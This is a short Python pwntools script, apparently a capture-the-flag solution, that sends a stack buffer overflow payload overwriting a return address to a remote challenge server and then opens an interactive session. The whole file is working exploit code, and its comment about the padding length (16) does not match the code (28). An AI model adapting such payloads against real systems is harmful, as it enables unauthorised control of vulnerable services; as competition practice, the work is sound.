from pwn import *

# Target information
host = 'challenge.ctf.games'
port = 31110

# Payload: 16 A's + target address (0x080491f5 in little-endian)
payload = b'A' * 28 + b'\xf5\x91\x04\x08'

# Start a connection to the remote server
try:
    r = remote(host, port)

    # Send the payload
    r.sendline(payload)

    # Try to receive a response gracefully
    response = r.recv(timeout=2)  # Use recv() instead of recvall() for partial data
    if response:
        print(response.decode(errors='ignore'))  # Handle any decoding issues
    else:
        print("[INFO] No response received.")

    # Use interactive mode only if the connection is still open
    r.interactive()

except EOFError:
    print("[ERROR] Connection closed unexpectedly.")
except Exception as e:
    print(f"[ERROR] An exception occurred: {e}")

finally:
    r.close()